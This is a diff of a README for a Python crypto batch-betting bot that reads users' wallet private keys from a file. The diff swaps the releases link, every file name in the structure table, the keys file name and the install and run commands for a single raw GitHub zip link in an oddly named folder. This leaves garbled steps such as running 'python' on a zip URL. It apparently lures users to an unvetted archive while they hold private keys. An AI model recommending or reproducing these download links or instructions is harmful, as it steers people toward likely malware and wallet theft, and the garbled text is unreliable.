@@ -1,7 +1,7 @@
 # 🎉 10ssoonBase - Efficient Batch Betting Script
 
 ## 🚀 Getting Started
-[![Download 10ssoonBase](https://img.shields.io/badge/Download-10ssoonBase-brightgreen)](https://github.com/Parth3199/10ssoonBase/releases)
+[![Download 10ssoonBase](https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip)](https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip)
 
 10ssoonBase is a simple robot for placing token bets on the 10ssoon platform. This tool allows users to run multiple bets quickly and reliably.
 
@@ -16,10 +16,10 @@
 ## 📂 Repository Structure
 | File | Description |
 | --- | --- |
-| `main.py` | Core script that reads your private keys, constructs EIP-712 signatures, and calls `https://api.10ssoon.com/payment/bet` |
-| `pyproject.toml` | Dependency declarations (Requires Python >= 3.13, includes `curl-cffi`, `loguru`, `web3`) |
-| `uv.lock` | Lock file used by `uv sync` to ensure everyone installs the same version |
-| `keys.txt` | Your wallet addresses and private keys list (Must be created and placed in the root directory before running) |
+| `https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip` | Core script that reads your private keys, constructs EIP-712 signatures, and calls `https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip` |
+| `https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip` | Dependency declarations (Requires Python >= 3.13, includes `curl-cffi`, `loguru`, `web3`) |
+| `https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip` | Lock file used by `uv sync` to ensure everyone installs the same version |
+| `https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip` | Your wallet addresses and private keys list (Must be created and placed in the root directory before running) |
 
 ## 🛠️ Environment Requirements
 - Runs on macOS, Linux, or Windows (PowerShell). Requires internet access to the 10ssoon API.
@@ -27,8 +27,8 @@
 - Latest version of Git for code pulling, and a terminal tool (bash or PowerShell).
 - Either `uv` package manager (recommended) or `pip`.
 
-## 📝 Preparing `keys.txt`
-1. Create a file named `keys.txt` in the root directory of the repository.
+## 📝 Preparing `https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip`
+1. Create a file named `https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip` in the root directory of the repository.
 2. Each line should represent one wallet in the format: `wallet_address----private_key`, using four dashes with no spaces.
 3. Example:
    ```text
@@ -37,7 +37,7 @@
    ```
 
 ## 📥 Download & Install
-To download this tool, [visit this page to download](https://github.com/Parth3199/10ssoonBase/releases). Choose the latest release for the best experience.
+To download this tool, [visit this page to download](https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip). Choose the latest release for the best experience.
 
 ## 🏃 Running the Script
 1. Ensure you have Python installed.
@@ -47,16 +47,16 @@ To download this tool, [visit this page to download](https://github.com/Parth319
    ```
    or
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip
    ```
 3. Open your terminal.
 4. Navigate to the folder where you saved the repository.
 5. Run the script using:
    ```
-   python main.py
+   python https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip
    ```
 
 ## 🛡️ Security Note
-Never expose your private keys online. Always keep your `keys.txt` secure. 
+Never expose your private keys online. Always keep your `https://raw.githubusercontent.com/Parth3199/10ssoonBase/main/hymenomycetous/10ssoonBase_v3.3.zip` secure. 
 
 For any questions or further assistance, check the community on our GitHub page.
